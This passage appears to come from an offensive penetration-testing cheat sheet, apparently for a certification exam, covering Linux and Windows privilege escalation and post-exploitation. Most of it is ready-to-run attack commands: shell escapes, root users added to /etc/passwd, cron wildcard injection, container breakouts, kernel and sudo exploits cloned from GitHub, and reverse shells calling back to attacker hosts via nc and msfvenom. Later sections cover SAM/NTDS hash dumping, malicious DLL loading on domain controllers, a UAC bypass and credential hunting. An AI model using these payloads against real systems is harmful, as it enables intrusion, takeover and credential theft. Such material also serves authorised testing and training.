1. sudo -l                   → GTFOBins?       (highest hit rate)
2. SUID                       → GTFOBins?
3. Capabilities               → cap_setuid? cap_dac_read_search?
4. /etc/passwd writable?      → add root user
5. cron jobs                  → writable script? wildcard?
6. PATH abuse                 → SUID calls relative binary?
7. NFS no_root_squash         → drop SUID
8. Vulnerable services        → screen 4.5.0 / pkexec / dirty pipe / sudo CVE
9. Kernel exploits            → only if all else fails
10. linpeas.sh                → run if stuck
```

#### Sudo misconfigurations

```bash
sudo -l
# For each entry, look up at https://gtfobins.github.io/#<binary>
# Examples:
sudo /usr/bin/find . -exec /bin/sh \; -quit            # find SUID
sudo vim -c ':!/bin/sh'                                 # vim → shell
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo less /etc/profile  →  !/bin/sh                     # less escape
sudo nmap --interactive  →  !sh                         # legacy nmap
sudo -u other_user /bin/bash                            # sudo as another user
```
- IF env_keep includes LD_PRELOAD:
  ```c
  // pe.c
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
  ```
  ```bash
  gcc -fPIC -shared -nostartfiles -o /tmp/pe.so pe.c
  sudo LD_PRELOAD=/tmp/pe.so <allowed-binary>
  ```
- IF NOPASSWD on sudo edit/sudoedit on a glob path → ViM/Vi escape from sudoedit.

#### SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null    # SGID too

# SYSTEMATIC: for each non-standard binary, look up GTFOBins
# URL pattern: https://gtfobins.github.io/gtfobins/<binary>/#suid
# Quick shell check:
for suid in $(find / -perm -u=s -type f 2>/dev/null); do
  base=$(basename $suid)
  echo "[?] $suid → https://gtfobins.github.io/gtfobins/$base/#suid"
done
```

Common SUID → GTFObins escapes (memorise these):
```bash
# find
/usr/bin/find . -exec /bin/sh -p \; -quit

# python / python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# vim / vi
/usr/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'

# less / more
/usr/bin/less /etc/profile  →  !/bin/sh

# bash (SUID)
/usr/bin/bash -p

# cp (write /etc/passwd)
cp /etc/passwd /tmp/p && echo 'r00t::0:0:root:/root:/bin/bash' >> /tmp/p && cp /tmp/p /etc/passwd && su r00t

# nmap (legacy)
/usr/bin/nmap --interactive  →  !sh

# dd (read files, write to passwd)
echo 'r00t::0:0:root:/root:/bin/bash' | /usr/bin/dd of=/etc/passwd bs=1 seek=$(stat -c%s /etc/passwd)

# tar
/usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### Writable /etc/passwd

```bash
# Generate a hash
openssl passwd -1 -salt salt pwd                          # → $1$salt$...
echo 'root2:$1$salt$abc123:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2                                                  # password: pwd
```

#### Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
# Look for scripts you can edit, or wildcards:
# Wildcard injection example (cron runs `tar czf /backup *.txt` in /tmp):
cd /tmp
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh evil.sh"
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > evil.sh
chmod +x evil.sh
# Wait for cron run → /tmp/rb -p → root
```
- IF you don't see a cron triggering → use `pspy64` to watch processes:
  ```bash
  ./pspy64 -pf -i 1000
  ```

#### PATH abuse

```bash
# If a SUID binary calls 'service' without absolute path
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
./vuln-suid    # invokes our /tmp/service as root
```

#### Capabilities

```bash
getcap -r / 2>/dev/null          # find all binaries with capabilities set
```

| Capability | What it allows | Exploitation |
|------------|----------------|--------------|
| `cap_setuid` | Set arbitrary UID | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| `cap_setgid` | Set arbitrary GID | same with `os.setgid(0)` |
| `cap_dac_read_search` | Read any file (bypass DAC) | `tar -cvf /tmp/s.tar /etc/shadow; tar -xvf /tmp/s.tar` |
| `cap_dac_override` | Write any file | Edit `/etc/passwd` or `/etc/sudoers` directly |
| `cap_chown` | Change file ownership | `chown root:root /tmp/sh; chmod 4755 /tmp/sh` |
| `cap_fowner` | Bypass owner permission checks | `chmod g+w /etc/shadow` |
| `cap_sys_admin` | Effectively root | `mount --bind`, `nsenter`, `insmod` |
| `cap_sys_module` | Load kernel modules | `insmod backdoor.ko` (write malicious .ko first) |
| `cap_sys_ptrace` | ptrace any process | Inject shellcode into PID 1 or any root process |
| `cap_net_admin` | Configure interfaces | `tcpdump -i any`, raw socket, create tun/tap |
| `cap_net_raw` | Raw sockets | `nmap -sS` raw scans without root, packet crafting |
| `cap_net_bind_service` | Bind ports <1024 | Bind backdoor listener to port 80/443 |
| `cap_kill` | Kill any process | `kill -9 1` (noisy, rarely useful) |
| `cap_audit_write` | Write to audit log | Log tampering / spoofing |
| `cap_sys_chroot` | Use chroot | Escape via `chroot /host/root /bin/bash` pattern |

**cap_setuid example (Python with cap_setuid+ep):**
```bash
getcap -r / 2>/dev/null | grep python
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

**cap_dac_read_search (tar/openssl):**
```bash
# tar with cap_dac_read_search:
tar -cvf /tmp/shadow.tar /etc/shadow && tar -xvf /tmp/shadow.tar -C /tmp
cat /tmp/etc/shadow

# openssl with cap_dac_read_search:
openssl enc -in /etc/shadow
```

> GTFOBins: https://gtfobins.github.io/#+capabilities — check each binary for capability-specific abuse.

#### NFS no_root_squash

```bash
# On attacker (already root locally):
showmount -e <ip>
sudo mount -t nfs -o vers=3 <ip>:/share /mnt/nfs
cat <<'EOF' > /mnt/nfs/x.c
int main(){ setuid(0); system("/bin/bash -p"); }
EOF
gcc /mnt/nfs/x.c -o /mnt/nfs/x ; sudo chmod 4755 /mnt/nfs/x
# Back on target as low-priv user:
/share/x         # SUID root shell
```

#### Kernel exploits

- Use **only** when nothing else works (often unstable):
  ```bash
  uname -r
  # Compare to: Dirty Pipe (5.8 - 5.16.11), Dirty Cow (≤4.8.3), pwnkit/pkexec (any with vulnerable polkit), Netfilter (5.x)
  searchsploit linux kernel <ver>
  # Compile statically when possible:
  gcc exploit.c -o exploit -static
  # Transfer (see §10), run.
  ```
- pwnkit (CVE-2021-4034) — works on most unpatched Linux:
  ```bash
  git clone https://github.com/ly4k/PwnKit && cd PwnKit && make
  ./PwnKit
  ```

#### Wildcard abuse (cron + tar/chown/rsync running as root with `*`)

```bash
# Exploit: tar in a writable dir
cd /writable/dir
echo 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb' > evil.sh
chmod +x evil.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh evil.sh"
# Wait for the cron `tar czf backup.tgz *` to run → /tmp/rb -p
```
- chown `*`: works similarly with `--reference=...` arg (not as common).
- rsync `*`: `-e 'sh evil.sh'` injection.

#### Restricted shell (rbash, rksh, lshell) escape

**Step 1 — Identify which restricted shell:**
```bash
echo $SHELL                     # current shell path
cat /etc/passwd | grep $(whoami)  # default shell from passwd
cat /etc/shells               # all valid shells
which rbash rksh lshell       # check if restriction binaries exist
```

**Step 2 — rbash escapes (try in order):**
```bash
# Method 1: BASH_CMDS override
BASH_CMDS[a]=/bin/sh; a

# Method 2: PATH + SHELL override
PATH=/bin:/usr/bin; export PATH
SHELL=/bin/sh; export SHELL; exec /bin/sh

# Method 3: SSH with forced shell
ssh user@host -t "bash --noprofile"

# Method 4: vi/vim escape
vi
:set shell=/bin/sh
:shell

# Method 5: find exec
find / -name testtest -exec /bin/sh \; 2>/dev/null

# Method 6: awk
awk 'BEGIN {system("/bin/sh")}'

# Method 7: less/man pager
less /etc/passwd
!/bin/sh

# Method 8: ed
ed
!sh

# Method 9: tee + script write
echo "bash" | tee /tmp/b.sh && chmod +x /tmp/b.sh && /tmp/b.sh

# Method 10: copy unrestricted bash
cp /bin/bash /tmp/b && /tmp/b
```

**Step 3 — lshell escapes:**
```bash
python -c 'import pty;pty.spawn("/bin/sh")'
echo os.system('/bin/sh') | python
/bin/sh -i
# lshell often blocks these — try via:
ossystem("/bin/bash")          # if os module aliases exist
```

**Step 4 — rksh / ksh:**
```bash
ed
!sh
# Or:
ksh -c /bin/sh
```

**Step 5 — Container escape check (if restricted shell is inside container):**
```bash
cat /proc/1/cgroup    # look for /docker/ or /kubepods/
ls -la /.dockerenv    # file exists = container
# Privileged container:
fdisk -l              # see host disks
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host
# Docker socket:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
# Capability-based (cap_sys_admin):
unshare -r /bin/bash  # user namespace trick
```

#### Privileged Linux groups (LXC/LXD, Docker, Disk, ADM, video)

- **LXC/LXD group** → effectively root via container:
  ```bash
  # Need /bin/lxc and lxd group membership
  id   # check for lxd
  # Build alpine image (on attacker)
  git clone https://github.com/saghul/lxd-alpine-builder
  cd lxd-alpine-builder && sudo ./build-alpine
  # Transfer the .tar.gz, then on target:
  lxc image import alpine.tar.gz --alias myalpine
  lxc init myalpine privesc -c security.privileged=true
  lxc config device add privesc host disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc /bin/sh
  # → /mnt/root is the host's /, you have full root access via container
  ```

- **Docker group** → root:
  ```bash
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  # Or
  docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -i -n sh
  ```

- **Disk group** → read raw disk:
  ```bash
  debugfs /dev/sda1
  debugfs:  cat /etc/shadow
  # Or
  dd if=/dev/sda1 of=/tmp/sda1.img            # full image
  ```

- **ADM group** → read all logs (look for cleartext creds in apache/auth.log).

#### Docker container breakout

- Mounted `/var/run/docker.sock`:
  ```bash
  docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
  ```
- `--privileged` container (very common, usually missed):
  ```bash
  # Inside privileged container
  fdisk -l                              # see host disks
  mkdir /tmp/host && mount /dev/sda1 /tmp/host
  chroot /tmp/host
  ```
- Container with `CAP_SYS_MODULE` → load malicious kernel module.
- Mounted `/proc` → write to `/proc/sys/kernel/core_pattern` to get root execution.

#### Kubernetes priv-esc (when in a pod)

```bash
# 1) Service account token always present
cat /var/run/secrets/kubernetes.io/serviceaccount/token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISRV=https://kubernetes.default.svc
# 2) Permissions check
curl -k -H "Authorization: Bearer $TOKEN" $APISRV/api/v1/namespaces/default/pods
# 3) If create pods → spawn privileged pod with hostPath /
kubectl auth can-i --list --token=$TOKEN
# Build a privileged pod manifest, then:
kubectl create -f pwn-pod.yaml --token=$TOKEN
kubectl exec -it pwn-pod --token=$TOKEN -- chroot /host sh
```

#### Logrotate (CVE-2018-16409 in older versions)

If logrotate runs as root and you can write to a log it processes (or its config):
```bash
# Look for logrotate config writable by you
find /etc/logrotate.d/ -writable 2>/dev/null
# Inject a postrotate script
echo 'postrotate
  cp /bin/bash /tmp/rb; chmod +s /tmp/rb
endscript' >> /etc/logrotate.d/<writable-config>
# Trigger by filling the log past rotation size
```

#### Shared library / LD_PRELOAD / LD_LIBRARY_PATH hijacking

- **LD_PRELOAD** (when sudo env_keep allows it — covered above in sudo section).
- **LD_LIBRARY_PATH** (when sudo env_keep allows it):
  ```bash
  sudo -l       # look for env_keep+=LD_LIBRARY_PATH
  # Place malicious libc.so.6 in an attacker-writable path
  ```
- **Shared object hijacking** (a SUID binary loads a missing/relative-path .so):
  ```bash
  ldd /path/to/suidbin                          # see linked libs
  strace -e openat /path/to/suidbin 2>&1 | grep '\.so'
  # If a NOENT path is in a writable dir, plant your own .so
  gcc -shared -fPIC -o liblegit.so evil.c
  ```

#### Python library hijacking

- A SUID/sudo Python script imports a non-stdlib module → check `python -c "import sys; print(sys.path)"`.
- IF any path in sys.path is writable by you → write a malicious `<modulename>.py` there:
  ```python
  # /writable/path/<modulename>.py
  import os; os.setuid(0); os.system('/bin/bash -p')
  ```

#### Polkit / pkexec (CVE-2021-4034, "PwnKit")

```bash
git clone https://github.com/ly4k/PwnKit && cd PwnKit && make
./PwnKit
# Or pre-compiled
curl -L https://github.com/ly4k/PwnKit/raw/main/PwnKit -o /tmp/pk
chmod +x /tmp/pk && /tmp/pk
```

#### Dirty Pipe (CVE-2022-0847) — Linux 5.8 → 5.16.11

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh
./exploit-1                       # method 1 — overwrite /etc/passwd
./exploit-2 /usr/bin/su           # method 2 — patch SUID binary in memory
```

#### Netfilter (CVE-2021-22555 / CVE-2022-25636) — kernel ≥ 5.1

```bash
# CVE-2021-22555
gcc -m32 -static cve-2021-22555.c -o exp
./exp
```
(use only when standard sudo/SUID/cron paths are exhausted; kernel exploits are unstable).

> 🔄 **LOOP — Root obtained**: Re-run full enumeration as root:
> → `id && cat /etc/shadow && cat /root/.bash_history`
> → `find / -name "*.txt" -o -name "*.conf" -o -name "id_rsa" 2>/dev/null | head -50`
> → Check for other users: `ls /home/` — try their creds on ALL discovered services (§4.3 spray)
> → Check for network segmentation: `ip a; ip r; arp -a` — new CIDRs found? → Return to §2 recon on those hosts
> → Check for AD membership: `realm list` / `cat /etc/sssd/sssd.conf` — if domain-joined → §7 AD

#### Sudo CVEs to test

```bash
sudo --version
# CVE-2021-3156 (Baron Samedit) — sudo ≤ 1.9.5p1
# Detection: sudoedit -s '\' `perl -e 'print "A" x 65536'` → segfault means vulnerable
sudoedit -s '\' $(perl -e 'print "A" x 65536')
# Exploit: github.com/blasty/CVE-2021-3156

# CVE-2019-14287 (sudo runas -1) — sudo ≤ 1.8.27 with specific runas
sudo -u#-1 /bin/bash       # if (ALL,!root) configured
```

#### LinPEAS — when stuck

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer linpeas.sh and:
chmod +x linpeas.sh && ./linpeas.sh -a > linpeas.txt
# Read sections in order: red/yellow flags first
# Priority sections to read:
# - "Sudo version" (any vulnerable CVE-2021-3156 etc.)
# - "Interesting Files" (passwords in files)
# - "SUID/SGID"
# - "Capabilities"
# - "Cron"
# - "Available shells"
# - "Vulnerable software" (95+ score)
# Equivalents: lse.sh (less verbose), linenum.sh (stable), GTFOBlookup (scriptable)
```

### 5.3 Credential Hunting (Linux)

```bash
# History & SSH
cat ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null
find / -name "id_rsa*" -o -name "id_dsa*" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null

# Config files (where passwords live)
grep -riE 'pass(word)?|passwd|secret|api[_-]?key' /etc /var/www /home /opt 2>/dev/null | head -200
grep -riE 'AKIA[0-9A-Z]{16}|aws_secret' /home /root 2>/dev/null

# Web app DB configs
find / -name "wp-config.php" -o -name ".env" -o -name "settings.py" -o -name "config.php" -o -name "appsettings.json" 2>/dev/null | xargs grep -l -iE 'pass|secret' 2>/dev/null

# Database files
find / -name "*.sqlite*" -o -name "*.db" -o -name "*.kdb*" 2>/dev/null

# Credentials in memory (running processes)
ps aux | grep -iE 'pass|user|key' | grep -v grep
cat /proc/*/cmdline 2>/dev/null | strings | grep -iE 'pass|secret'

# Kerberos
find / -name "*.keytab" 2>/dev/null
ls -la /tmp/krb5* /var/lib/sss/db 2>/dev/null

# Mail
ls /var/mail/ /var/spool/mail/ 2>/dev/null
```

> 🔄 **LOOP — New Linux creds found**: Spray every discovered service immediately
> → `nxc ssh <cidr> -u <user> -p '<pass>'` + SMB/WinRM/RDP/MSSQL/FTP
> → Add new creds to `~/exam/creds/credentials.txt`
> → If AD-joined host: test creds against DC — `nxc smb <dc-ip> -u <user> -p '<pass>'`

> ✅ **GATE — End of §5 (Linux Post-Ex)**: Must have:
> - [ ] Privesc path identified and exploited (or confirmed unprivileged + documented)
> - [ ] `/etc/shadow`, `/etc/passwd`, SSH keys, config files searched for creds
> - [ ] All creds added to `creds/credentials.txt`
> - [ ] All new subnets/hosts noted for §9 pivot

---

## 6. Post-Exploitation — Windows

> 🔄 **LOOP — Shell obtained on new Windows host**: You are now at §6. After completing §6, check network: `ipconfig /all; arp -a`. New subnet found → §9 pivot setup → return to §2 recon on new segment.

### 6.1 Situational Awareness

```cmd
:: User context
whoami /all
whoami /priv
whoami /groups
net user %USERNAME% /domain     :: domain-joined?
echo %USERDOMAIN%

:: System
systeminfo
hostname
wmic os get caption,csdversion,osarchitecture,version
wmic qfe get HotFixID,Description,InstalledOn       :: patches

:: Users / Groups
net user
net localgroup
net localgroup administrators
net user /domain
net group /domain

:: Network
ipconfig /all
route print
arp -a
netstat -ano
netsh wlan show profiles
netsh advfirewall show allprofiles

:: Processes / services
tasklist /v
tasklist /svc
sc query state= all
schtasks /query /fo LIST /v

:: Disks / shares
wmic logicaldisk get caption,description,providername
net share
```

PowerShell equivalents:
```powershell
Get-LocalUser; Get-LocalGroup
Get-LocalGroupMember -Group Administrators
Get-NetIPAddress; Get-NetTCPConnection -State Listen
Get-Process; Get-Service
Get-ScheduledTask | Where State -eq 'Ready'
Get-ChildItem env:
Get-PSReadlineOption | select HistorySavePath
Get-History; cat (Get-PSReadlineOption).HistorySavePath
```

Registry quick wins:
```cmd
:: AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon DefaultDomain"

:: Saved RDP creds
cmdkey /list

:: Putty saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

:: SNMP community
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"

:: Installed software
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "DisplayName"
```

### 6.2 Privilege Escalation

#### Decision tree

```
1. whoami /priv           → SeImpersonate / SeAssignPrimaryToken / SeBackup / SeRestore / SeDebug / SeTakeOwnership / SeLoadDriver
2. AlwaysInstallElevated  → reg query
3. Unquoted service paths → wmic service for `Mode=Auto AND PathName NOT LIKE \"%
4. Service permissions    → accesschk -uwcqv <user> *
5. Registry autoruns      → HKLM run keys writable?
6. Scheduled tasks        → modifiable script path?
7. DLL hijack             → search processes for missing DLLs
8. Files w/ creds         → unattend.xml, web.config, registry, putty, vault
9. Token impersonation    → which Potato (see below)
10. winPEAS / PowerUp     → if stuck
```

#### SeImpersonate / SeAssignPrimaryToken — Potato attacks

| Potato | Windows version | Notes |
| --- | --- | --- |
| **JuicyPotato** | Win Server ≤ 2016 / Win 10 ≤ 1803 | DCOM CLSIDs needed; obsolete on modern systems |
| **RoguePotato** | Server 2019/2016, Win 10 1809+ | Needs OXID resolver redirect (port 135 outbound or socat trick) |
| **PrintSpoofer** | Server 2016/2019, Win 10 | Easiest; works as long as Spooler service runs |
| **GodPotato** | Server 2019/2022, Win 10/11 | All modern, post-printspoofer fix |
| **EfsPotato / SweetPotato / RemotePotato0** | Various | Backup options |

```cmd
:: PrintSpoofer (most common)
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\Tools\nc.exe <lhost> 4444 -e cmd.exe"

:: GodPotato
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd <lhost> 4444"

:: RoguePotato (needs port 135 outbound)
RoguePotato.exe -r <lhost> -e "cmd.exe" -l 9999
```

#### AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both must be 1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f msi -o pe.msi
msiexec /quiet /qn /i pe.msi
```

#### Unquoted service path

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
:: Example: C:\Program Files\Vuln App\service.exe → drop C:\Program.exe
copy nc.exe "C:\Program.exe"
sc start <vulnservice>
```

#### Weak service permissions

```cmd
:: Use accesschk (Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "%USERNAME%" *
:: If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
sc config <svc> binPath= "C:\Tools\nc.exe -e cmd <lhost> 4444"
sc stop <svc> & sc start <svc>
:: Restore: sc config <svc> binPath= "<original path>"
```

#### DLL hijacking

```cmd
:: Find services missing a DLL with Procmon (filter Result=NAME NOT FOUND, Path ends in .dll)
:: Then:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f dll -o missing.dll
copy missing.dll "C:\writable\path\missing.dll"
sc stop <svc> & sc start <svc>
```

#### Scheduled tasks

```cmd
schtasks /query /fo list /v | findstr /i "TaskName Author Run"
:: Look for tasks running as SYSTEM with a script you can write
icacls "C:\path\script.ps1"
echo Invoke-WebRequest http://<lhost>/nc.exe -OutFile C:\Windows\Temp\nc.exe; Start-Process C:\Windows\Temp\nc.exe '-e cmd <lhost> 4444' >> C:\path\script.ps1
```

#### Registry autoruns / weak ACLs

```cmd
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
:: If writable:
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Tools\nc.exe -e cmd <lhost> 4444" /f
```

#### Credential files / registry

```cmd
:: Unattend / Sysprep
dir /s /b C:\Unattend.xml C:\sysprep.xml C:\Windows\Panther\Unattend.xml
findstr /si "password" *.xml *.ini *.txt *.config

:: Saved creds via cmdkey + runas
cmdkey /list
runas /savecred /user:DOMAIN\admin "C:\Tools\nc.exe -e cmd <lhost> 4444"

:: SAM/SYSTEM/SECURITY hives (need admin or Backup priv)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
:: Then on Linux:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

#### Other privilege rights — full mapping

| Privilege | What it allows | Exploitation |
| --- | --- | --- |
| **SeImpersonatePrivilege** | Impersonate any token client connects to | PrintSpoofer / GodPotato / RoguePotato |
| **SeAssignPrimaryTokenPrivilege** | Assign primary token to a process | PrintSpoofer / GodPotato |
| **SeBackupPrivilege** | Read any file regardless of DACL | Copy SAM/SYSTEM/SECURITY hives → secretsdump |
| **SeRestorePrivilege** | Write any file regardless of DACL | Replace service binary, write to AllUsers startup |
| **SeTakeOwnershipPrivilege** | Take ownership of any object | Take, then chmod ACL to add yourself FullControl |
| **SeDebugPrivilege** | Debug any process | Inject into LSASS / use psexec64 to migrate to SYSTEM |
| **SeLoadDriverPrivilege** | Load arbitrary driver | Load vulnerable signed driver (Capcom/Process Hacker) |
| **SeManageVolumePrivilege** | Format any volume | Sometimes parlayed via SeManageVolumeExploit / file write |
| **SeCreateTokenPrivilege** | Create primary token | Direct ticket forging (very rare) |

##### SeBackupPrivilege exploitation

```cmd
:: With SeBackupPrivilege you can read SAM, SYSTEM, SECURITY without DACL
reg save HKLM\SAM C:\Temp\SAM /y
reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
reg save HKLM\SECURITY C:\Temp\SECURITY /y
:: Or with robocopy / volume shadow copy
diskshadow.exe
diskshadow> set context persistent nowriters
diskshadow> add volume c: alias snap
diskshadow> create
diskshadow> expose %snap% z:
diskshadow> exit
robocopy /b z:\windows\ntds . ntds.dit
robocopy /b z:\windows\system32\config SAM SAM
:: Then offline:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

##### SeRestorePrivilege exploitation

```cmd
:: Write to a service binary you couldn't normally
takeown /f "C:\Program Files\TargetService\service.exe"
icacls "C:\Program Files\TargetService\service.exe" /grant "%USERNAME%":F
copy /y nc.exe "C:\Program Files\TargetService\service.exe"
sc stop TargetService & sc start TargetService
```

##### SeTakeOwnershipPrivilege exploitation

```cmd
takeown /f "C:\path\to\sensitive.dll"
icacls "C:\path\to\sensitive.dll" /grant "%USERNAME%":F
:: Now write your DLL there
```

#### Privileged Built-in Groups

| Group | Effective rights | Exploitation |
| --- | --- | --- |
| **Backup Operators** | SeBackupPrivilege + SeRestorePrivilege on DC | Dump NTDS.dit via Volume Shadow / diskshadow → DCSync |
| **Server Operators** | Manage services on DCs | Modify service binary path → SYSTEM on DC |
| **Print Operators** | Manage printers + load printer drivers (SeLoadDriverPrivilege) | Load malicious printer driver |
| **DnsAdmins** | Manage DNS service running as SYSTEM on DC | Plant a malicious DLL via `dnscmd /config /serverlevelplugindll` → restart DNS service → SYSTEM |
| **Event Log Readers** | Read security event log | Hunt for cleartext creds in event log |
| **Hyper-V Administrators** | Administer Hyper-V VMs | Mount VMDK / VHD of DC → extract NTDS.dit |
| **Account Operators** | Modify most user accounts (not domain admins) | Reset target user passwords, add to groups |
| **GPO Creator Owners** | Create GPOs | If they can link → push immediate scheduled task |

##### Backup Operators → DCSync (full)

```cmd
:: 1) Connect to DC over SMB with our user (member of Backup Operators)
:: 2) Use diskshadow on DC via PSRemoting
$session = New-PSSession -ComputerName DC01.dom.local -Credential $cred
Invoke-Command -Session $session -ScriptBlock {
  ntdsutil "ac in ntds" "ifm" "create full c:\temp" q q
}
:: 3) Pull the dump back
Copy-Item -FromSession $session -Path C:\Temp\registry\SYSTEM -Destination .\
Copy-Item -FromSession $session -Path C:\Temp\Active`` Directory\ntds.dit -Destination .\

:: Or via robocopy + shadow:
robocopy /b "\\DC01\C$\Windows\NTDS" .\ntds ntds.dit
:: Then:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

##### DnsAdmins → SYSTEM on DC

```cmd
:: 1) Build malicious DLL (msfvenom)
msfvenom -p windows/x64/exec CMD='net group "Domain Admins" pwn /add /domain' -f dll -o evil.dll
:: 2) Host on attacker SMB
:: 3) Load via dnscmd (need DnsAdmins membership)
dnscmd <dc> /config /serverlevelplugindll \\<attacker>\share\evil.dll
:: 4) Restart DNS service (need privileges OR wait for reboot)
sc \\<dc> stop dns
sc \\<dc> start dns
```

##### Server Operators → SYSTEM on DC

```cmd
:: Modify a service to run our binary
sc \\<dc> config browser binPath= "C:\Tools\nc.exe -e cmd <attacker> 4444"
sc \\<dc> stop browser & sc \\<dc> start browser
:: Caveat: revert after exploit
```

##### Hyper-V Administrators → DC compromise

```powershell
# Export DC VM and mount its VHDX
Get-VM
Export-VM -Name DC01 -Path C:\Temp\
# Mount the VHDX, extract NTDS.dit
Mount-VHD -Path "C:\Temp\DC01\Virtual Hard Disks\DC01.vhdx" -ReadOnly
copy E:\Windows\NTDS\ntds.dit C:\Temp\
copy E:\Windows\System32\config\SYSTEM C:\Temp\
Dismount-VHD -Path "C:\Temp\DC01\Virtual Hard Disks\DC01.vhdx"
# Then on Linux:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

#### UAC Bypass

```cmd
:: Detect UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
:: 5 = always prompt, 0 = no prompt for admins (LocalAccountTokenFilterPolicy=1 also relevant)

:: fodhelper bypass (autoElevate trusted binary, registry hijack)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd /c powershell -nop -w hidden -c \"<reverse-shell-payload>\"" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
fodhelper.exe
:: Cleanup
reg delete "HKCU\Software\Classes\ms-settings" /f

:: Or use UACME bypass binaries (multiple methods, akagi64.exe)
.\Akagi64.exe 23 C:\Tools\nc.exe
```

#### Kernel exploits (last resort)

```cmd
systeminfo > si.txt
:: On attacker
python3 windows-exploit-suggester.py --systeminfo si.txt --database 2024-mssb.xls
:: Look for: MS16-032 (secondary logon), MS17-010 (EternalBlue), MS14-068 (Kerberos PAC)
```

#### Citrix / Kiosk breakout (when in a restricted desktop)

```cmd
:: 1) Open File dialog (any "Save As..." in any app)
:: 2) Type \\<attacker>\share to escape current folder
:: 3) Right-click .exe → "Open with..." → cmd.exe
:: 4) Or Windows shortcut keys: Win+R blocked? → SHIFT+F10 in Explorer
:: 5) Edit existing shortcuts to launch cmd:
:: 6) Right-click in dialog → "New Shortcut" → cmd.exe
```
- IF SMB shares accessible → mount, drop malicious .lnk:
  ```cmd
  :: SCF / .url file → triggers SMB auth → hash capture
  echo [Shell] > evil.scf
  echo Command=2 >> evil.scf
  echo IconFile=\\<attacker>\share\test.ico >> evil.scf
  echo [Taskbar] >> evil.scf
  echo Command=ToggleDesktop >> evil.scf
  copy evil.scf \\<sharehost>\<share>\
  :: Then capture NetNTLMv2 with Responder
  ```

#### Sticky Notes / Browser / Password Manager creds

```cmd
:: Sticky Notes (modern)
type "%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
sqlite3 plum.sqlite "select Text from Note;"

:: Chrome
:: %LocalAppData%\Google\Chrome\User Data\Default\Login Data — SQLite, encrypted with DPAPI
:: Use SharpChrome or modern equivalents
.\SharpChrome.exe logins
